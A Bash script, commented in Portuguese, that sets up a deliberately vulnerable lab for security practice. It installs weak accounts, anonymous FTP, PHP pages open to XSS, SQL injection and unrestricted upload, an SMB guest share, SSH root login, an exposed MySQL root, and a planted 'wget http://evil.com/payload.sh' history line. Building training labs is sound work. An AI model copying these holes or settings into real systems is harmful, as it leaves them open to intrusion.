#!/bin/bash

echo "========================================="
echo "⚠️  CONFIGURANDO SERVIÇOS VULNERÁVEIS"
echo "========================================="

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# ============ USUÁRIOS VULNERÁVEIS ============
echo -e "${YELLOW}[1/6] Criando usuários vulneráveis...${NC}"

# Usuário com senha fraca
useradd -m -s /bin/bash hacker
echo "hacker:hacker123" | chpasswd
echo "hacker ALL=(ALL) ALL" >> /etc/sudoers.d/hacker

# Usuário com senha em arquivo
useradd -m -s /bin/bash alvo
echo "alvo:password123" | chpasswd

# Usuário com histórico suspeito
useradd -m -s /bin/bash suspect
echo "suspect:letmein" | chpasswd
su - suspect -c "echo 'mysql -u root -psecret' >> ~/.bash_history"
su - suspect -c "echo 'ssh root@192.168.1.100' >> ~/.bash_history"
su - suspect -c "echo 'wget http://evil.com/payload.sh' >> ~/.bash_history"

# ============ FTP VULNERÁVEL ============
echo -e "${YELLOW}[2/6] Configurando FTP anônimo...${NC}"
apt-get install -y vsftpd

cat > /etc/vsftpd.conf << EOF
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
dirmessage_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO
EOF

mkdir -p /srv/ftp/upload
chown ftp:ftp /srv/ftp/upload
chmod 777 /srv/ftp/upload

# Adicionar arquivos interessantes no FTP
echo "flag{ftp_anonimo_$(openssl rand -hex 4)}" > /srv/ftp/flag.txt
echo "backup.zip" > /srv/ftp/arquivos.txt
dd if=/dev/urandom of=/srv/ftp/backup.zip bs=1K count=10 2>/dev/null

systemctl restart vsftpd

# ============ WEB VULNERÁVEL ============
echo -e "${YELLOW}[3/6] Configurando servidor web vulnerável...${NC}"
apt-get install -y apache2 php libapache2-mod-php

# Página com XSS
cat > /var/www/html/xss.php << 'EOF'
<!DOCTYPE html>
<html>
<head><title>XSS Lab</title></head>
<body>
<h1>Pesquisar</h1>
<form method="GET">
    <input type="text" name="q" placeholder="Digite sua busca">
    <input type="submit" value="Buscar">
</form>
<?php
if(isset($_GET['q'])) {
    echo "Você buscou por: " . $_GET['q'];
}
?>
</body>
</html>
EOF

# Página com SQL Injection
cat > /var/www/html/sqli.php << 'EOF'
<!DOCTYPE html>
<html>
<head><title>SQLi Lab</title></head>
<body>
<h1>Login</h1>
<form method="POST">
    Usuário: <input type="text" name="user"><br>
    Senha: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
</form>
<?php
if(isset($_POST['user'])) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];

    // Simulando conexão com banco
    echo "SELECT * FROM users WHERE user='$user' AND pass='$pass'<br>";

    if($user == "admin" && $pass == "admin") {
        echo "<h2>Bem-vindo, admin!</h2>";
        echo "flag{sqli_bypass_$(openssl rand -hex 4)}";
    } else {
        echo "Login falhou!";
    }
}
?>
</body>
</html>
EOF

# Página com upload vulnerável
cat > /var/www/html/upload.php << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Upload Lab</title></head>
<body>
<h1>Upload de Arquivo</h1>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="arquivo">
    <input type="submit" value="Enviar">
</form>
<?php
if(isset($_FILES['arquivo'])) {
    $target = "/var/www/html/uploads/" . $_FILES['arquivo']['name'];
    move_uploaded_file($_FILES['arquivo']['tmp_name'], $target);
    echo "Arquivo enviado com sucesso!";
}
?>
</body>
</html>
EOF

mkdir -p /var/www/html/uploads
chmod 777 /var/www/html/uploads

# Arquivo com senha hardcoded
cat > /var/www/html/config.php << 'EOF'
<?php
$db_user = "root";
$db_pass = "senha_root_123";
$api_key = "flag{hardcoded_secret}";
?>
EOF

chown -R www-data:www-data /var/www/html

# ============ SMB VULNERÁVEL ============
echo -e "${YELLOW}[4/6] Configurando SMB...${NC}"
apt-get install -y samba

cat >> /etc/samba/smb.conf << EOF

[public]
   comment = Compartilhamento Público
   path = /srv/samba/public
   browseable = yes
   read only = no
   guest ok = yes
   create mask = 0777
   directory mask = 0777

[secret]
   comment = Compartilhamento Secreto
   path = /srv/samba/secret
   browseable = no
   read only = no
   guest ok = no
   valid users = hacker
EOF

mkdir -p /srv/samba/{public,secret}
echo "flag{smb_share_$(openssl rand -hex 4)}" > /srv/samba/secret/flag.txt
echo "Documentos confidenciais" > /srv/samba/secret/dados.txt
echo "Arquivo público" > /srv/samba/public/README.txt

chown -R nobody:nogroup /srv/samba/public
chown -R hacker:hacker /srv/samba/secret
chmod 777 /srv/samba/public
chmod 700 /srv/samba/secret

systemctl restart smbd

# ============ SSH VULNERÁVEL ============
echo -e "${YELLOW}[5/6] Configurando SSH com senhas fracas...${NC}"
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
systemctl restart sshd

# ============ BANCO DE DADOS ============
echo -e "${YELLOW}[6/6] Configurando MySQL vulnerável...${NC}"
debconf-set-selections <<< 'mysql-server mysql-server/root_password password root'
debconf-set-selections <<< 'mysql-server mysql-server/root_password_again password root'
apt-get install -y mysql-server

mysql -u root -proot << EOF
CREATE DATABASE IF NOT EXISTS lab;
USE lab;
CREATE TABLE IF NOT EXISTS users (id INT, username VARCHAR(50), password VARCHAR(50));
INSERT INTO users VALUES (1, 'admin', 'admin123');
INSERT INTO users VALUES (2, 'user', 'password');
INSERT INTO users VALUES (3, 'hacker', 'hacker123');
CREATE TABLE IF NOT EXISTS flags (id INT, flag VARCHAR(100));
INSERT INTO flags VALUES (1, 'flag{mysql_injection_$(openssl rand -hex 4)}');
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
FLUSH PRIVILEGES;
EOF

sed -i 's/bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf
systemctl restart mysql

# ============ FIM ============
echo -e "${GREEN}=========================================${NC}"
echo -e "${GREEN}✅ SERVIÇOS VULNERÁVEIS CONFIGURADOS!${NC}"
echo -e "${GREEN}=========================================${NC}"
echo ""
echo "📌 Serviços disponíveis:"
echo "   FTP: ftp://localhost (anônimo)"
echo "   Web: http://localhost:8080"
echo "   SMB: //localhost/public (guest)"
echo "   SMB: //localhost/secret (usuário: hacker)"
echo "   SSH: localhost:22 (hacker/hacker123)"
echo "   MySQL: localhost:3306 (root/root)"
echo ""
echo "⚠️  AVISO: Estes serviços são INTENCIONALMENTE vulneráveis!"
echo "   Use apenas em ambiente isolado para aprendizado."
echo ""
